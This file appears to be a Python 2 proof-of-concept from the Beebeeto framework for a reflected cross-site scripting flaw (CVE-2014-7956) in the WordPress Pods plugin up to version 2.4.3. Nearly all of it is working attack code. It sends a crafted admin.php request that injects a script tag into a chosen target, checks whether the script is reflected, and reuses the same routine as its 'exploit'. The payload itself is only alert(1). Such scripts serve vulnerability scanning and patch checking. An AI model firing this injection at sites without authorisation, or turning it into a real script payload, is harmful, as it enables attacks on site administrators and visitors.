#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0010',
            'name': 'Wordpress Plugin Pods <= 2.4.3 XSS漏洞 POC',
            'author': '塞万铁牛',
            'create_date': '2015-01-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Wordpress with Pods plugin',
            'vul_version': ['<=2.4.3'],
            'type': 'Cross Site Scripting',
            'tag': ['Wordpress漏洞', 'Pods plugin漏洞', '/wp-admin/admin.php', 'php', 'CVE-2014-7956'],
            'desc': '''
                    Wordpress:小于2.4版本的Pods插件中<a>标记未闭合，导致HTTP GET参数数据中，可以产生反射型的xss漏洞。
                    ''',
            'references': ['http://www.securityfocus.com/archive/1/534437',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/wp-admin/admin.php?page=pods&action=edit&id=4"></a><script>alert(1)</script><!--'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '<script>alert(1)</script>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())